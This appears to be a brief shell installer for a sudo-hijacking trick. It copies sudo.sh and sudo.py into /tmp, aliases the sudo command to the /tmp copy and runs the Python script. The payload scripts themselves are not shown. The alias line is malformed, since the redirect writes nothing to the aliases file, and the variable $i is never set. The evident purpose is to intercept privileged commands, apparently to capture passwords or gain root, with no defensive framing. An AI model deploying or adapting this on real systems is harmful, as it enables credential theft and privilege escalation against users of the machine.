chmod +x sudo.sh
cp sudo.sh /tmp/sudo.sh

chmod +x sudo.py
cp sudo.py /tmp/sudo.py


alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases
python /tmp/sudo.py $i